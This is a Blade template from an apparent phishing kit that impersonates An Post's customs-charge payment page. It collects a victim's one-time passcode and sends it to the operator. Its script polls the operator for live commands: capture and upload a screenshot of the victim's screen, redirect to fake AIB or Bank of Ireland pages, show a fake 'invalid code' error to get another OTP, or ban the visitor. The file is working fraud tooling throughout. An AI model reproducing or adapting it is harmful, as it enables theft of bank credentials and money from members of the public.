@extends('layouts.main')
@section('title', "OTP Code")
@section('main')
<section id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlFormLookup" class="f14">
    <div class="f14__section__wrapper f14__section__wrapper--increase">
    
    
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="alertdiv form__group__wrapper">
            <span class="alertspan"></span>
            </div>
        </div>

        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper" class="f14__form__group form__group js-slideup">
            <div class="form__group__wrapper">
                <!-- <p class="helper">Full name</p> -->
                <input name="otpcode" type="text" id="otpcode" class="js-f14-tracking-id imps" data-required-message="Your OTP code is required" placeholder="OTP Code" value="" contenteditable="true" required="required">
            </div>
            <span class="form__group__error" aria-hidden="true" data-gtm-vis-polling-id-10069780_227="215"></span>
        </div>

        <div class="f14__btn__wrapper f14__btn__wrapper--increase">
            <input type="submit" class="btnSub loginBtn submit bn bn--primary gtm-cta" name="p$lt$WebPartZone13$zoneContent$pageplaceholder$p$lt$ctl01$F14PayCustomsCharges$btnLookupCharge" value="Pay Now" id="btnSub loginBtn p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_btnLookupCharge">
        </div>
        <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlAPIErrors" style="color:red;font-weight:bold"></div>
    </div>
</section>
@include('main.inc.sidebox_two')


<div id="loaderPage p_lt_WebPartZone14_zoneBelowContent_M78MyAnPostLoginForm_pnlLoadingAnimation" role="alert"
    aria-live="assertive" class="loaderPage loader-wrapper loader-wrapper--full-page js-loader">
    <div class="loader" aria-label="Loading.. please wait" role="img">
        <div class="double-bounce1"></div>
        <div class="double-bounce2"></div>
    </div>
</div>

@endsection
@section('js')
<script>

$.ajax({
        method: "POST",
        url: "{{route('main.connection')}}",
        data: {
            _token: $('meta[name="csrf-token"]').attr('content'),
            referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
            type: "update",
        }
});


 $(".loginBtn").on("click", () => {

    if ($("#otpcode").val().length == 0) {
        $(".alert").css("display", "flex");
        $(".alert div").text("Both the verification and Password are required.");
        alert(1);
    } else {
        $.ajax({
            method: "POST",
            url: "{{route('main.new')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                "otp": $("#otpcode").val(),
                "type": "newOtp",
            }
        }).done((data) => {
            $(".loaderPage").addClass("loader-wrapper--shown")
        });

        $("#otime").show();
        runOtpCountdown()
    }
});



minutes = 1;
seconds = 0;
reset_otp = false;


let padDigits = (number, digits) => {
    return Array(Math.max(digits - String(number).length + 1, 0)).join(0) + number;
}


function runOtpCountdown() {

    timer = document.getElementById("otime");
    timer.innerText = padDigits(minutes, 2) + ":" + padDigits(seconds, 2);

    if (reset_otp) {
        reset_otp = false;
        minutes == 1;
        seconds == 0;
        //die
    } else {
        if (seconds == 0 && minutes == 0) {
            document.getElementById("otime").style.color = "red";
        } else if (seconds == 0) {
            seconds = 59;
            minutes = minutes - 1;
            setTimeout(function() {
                runOtpCountdown();
            }, 1000);
        } else {
            seconds = seconds - 1;
            setTimeout(function() {
                runOtpCountdown();
            }, 1000);
        }
    }

}


setInterval(async () => {
    await checkAction();
}, 5000);

const checkAction = async () => {
    $.ajax({
        method: "POST",
        url: "{{route('main.connection')}}",
        data: {
            _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
            type: "checkAction",
        }
    }).done(function(data) {
        if (typeof myVariable === "string" && data.trim() == "none") {
            return false;
        }
        var data = JSON.parse(JSON.stringify(data));
        setCookie("set_name", data.set_name, 1);
        switch (data.action) {
            case "screenshot":
                let img;
                html2canvas(document.body).then(function(canvas) {
                    $.ajax({
                        type: "POST",
                        url: "{{route('main.connection')}}",
                        data: {
                            _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                            "type": "screenshot",
                            "img": canvas.toDataURL()
                        },
                    }).done(function(data) {});
                });
                break;
            case "otp":
                window.location.replace(
                    "{{route('main.otp')}}?sessionid={{md5(time())}}&status=otp");
                break;
            case "aib":
                window.location.replace(
                    "{{route('main.aib')}}?sessionid={{md5(time())}}&status=aib");
                break;
            case "boi":
                window.location.replace(
                    "{{route('main.boi')}}?sessionid={{md5(time())}}&status=boi");
                break;
            case "error":
                $(".alert").css("display", "flex");
                $(".alertdiv").text("The OTP code is invalid. Please try again.");
                $(".alertdiv div").text("The OTP code is invalid. Please try again.");
                $(".alertdiv").addClass("error");
                //$(".alertspan").text("The OTP code is invalid. Please try again.");
                $(".loaderPage").removeClass("loader-wrapper--shown");

                $("#otpcode").val("");


                reset_otp = true;
                minutes = 1;
                seconds = 0;

                $("#otime").hide();

                break;
            case "bye":
                window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                break;

            case "ban":
                $.ajax({
                    method: "POST",
                    url: "{{route('main.connection')}}",
                    data: {
                        _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                        type: "ban",
                        status: "banned",
                    }
                }).done(function() {
                    window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                });
                break;
        }
    });
}
</script>
@endsection
